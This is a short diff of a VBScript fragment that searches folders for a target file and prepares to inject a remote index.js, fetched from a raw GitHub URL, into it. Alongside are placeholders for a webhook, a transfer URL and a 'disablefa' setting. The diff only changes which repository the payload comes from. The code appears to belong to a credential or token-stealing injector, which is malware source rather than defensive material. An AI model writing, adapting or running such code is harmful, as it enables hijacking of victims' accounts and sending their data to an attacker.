@@ -30,7 +30,7 @@ For Each objSubFolder In objFolder.SubFolders
                                 If matchIndex.Count > 0 Then
                                     filePath = objFile.Path
                                     Dim your_url, your_file, webhook, transferurl, disablefa
-                                    your_url = "https://raw.githubusercontent.com/KSCH-58/sub/main/index.js"
+                                    your_url = "https://raw.githubusercontent.com/selfbot12345/subtest/main/index.js"
                                     your_file = filePath
                                     webhook = "your_webhook_value"
                                     transferurl = "your_transfer_url_value"
